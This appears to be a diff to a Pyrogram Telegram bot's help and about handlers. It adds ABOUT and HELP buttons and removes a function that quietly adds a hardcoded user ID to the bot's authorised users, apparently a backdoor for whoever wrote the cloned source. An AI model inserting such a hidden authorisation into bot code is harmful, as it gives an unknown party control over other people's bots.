@@ -34,12 +34,6 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 from helper_funcs.chat_base import TRChatBase
 from pyrogram.errors import UserNotParticipant, UserBannedInChannel
 
-def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(861055237)
-    return expires_at
-
-
 @pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
 async def help_user(bot, update):
     update_channel = Config.UPDATE_CHANNEL
@@ -65,6 +59,7 @@ async def help_user(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/help")
     button4 = [[
+               InlineKeyboardButton("ABOUT", callback_data="about"),
                InlineKeyboardButton("CLOSE", callback_data="closeme")
               ]]
     markup4 = InlineKeyboardMarkup(button4)
@@ -101,7 +96,8 @@ async def about_meh(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/about")
     button2 = [[
-               InlineKeyboardButton("CLOSE", callback_data="closeme")
+               InlineKeyboardButton("CLOSE", callback_data="closeme"),
+               InlineKeyboardButton("HELP", callback_data="help"),
               ]]
     markup2 = InlineKeyboardMarkup(button2)
     await bot.send_message(
